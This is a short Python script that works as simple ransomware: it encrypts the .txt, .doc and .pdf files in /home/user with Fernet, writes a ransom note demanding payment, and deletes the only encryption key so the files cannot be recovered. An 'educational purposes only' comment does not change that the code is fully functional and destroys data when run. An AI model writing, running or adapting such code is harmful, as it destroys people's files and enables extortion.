import random
from pathlib import Path
from cryptography.fernet import Fernet
import os

def generate_key():
    return Fernet.generate_key()

def load_key():
    return open("secret.key", "rb").read()

def save_key(key):
    with open("secret.key", "wb") as key_file:
        key_file.write(key)

def encrypt_file(file, key):
    fernet = Fernet(key)
    with open(file, "rb") as f:
        data = f.read()
    encrypted_data = fernet.encrypt(data)
    with open(file, "wb") as f:
        f.write(encrypted_data)

def decrypt_file(file, key):
    fernet = Fernet(key)
    with open(file, "rb") as f:
        encrypted_data = f.read()
    decrypted_data = fernet.decrypt(encrypted_data)
    with open(file, "wb") as f:
        f.write(decrypted_data)

def encrypt_directory(folder, key):
    folder = Path(folder)
    for file in folder.glob("*"):
        if file.is_file() and file.suffix in {".txt", ".doc", ".pdf"}:
            encrypt_file(file, key)
            print(f"Encrypted {file}")

def decrypt_directory(folder, key):
    folder = Path(folder)
    for file in folder.glob("*"):
        if file.is_file() and file.suffix in {".txt", ".doc", ".pdf"}:
            decrypt_file(file, key)
            print(f"Decrypted {file}")

def create_ransom_note():
    note = """
    Your files have been encrypted!
    To decrypt them, you must pay a ransom.
    Contact example@domain.com for payment instructions.
    """
    with open("/home/user/ransom_note.txt", "w") as note_file:
        note_file.write(note)

def main():
    # Ensure this path is isolated and used for educational purposes only.
    folder_path = "/home/user"

    key = generate_key()
    save_key(key)

    print("Encrypting files...")
    encrypt_directory(folder_path, key)
    
    create_ransom_note()
    
    # Remove the key to simulate ransom scenario
    os.remove("secret.key")
    print("Ransom note created. Key removed. Files encrypted.")

if __name__ == "__main__":
    main()
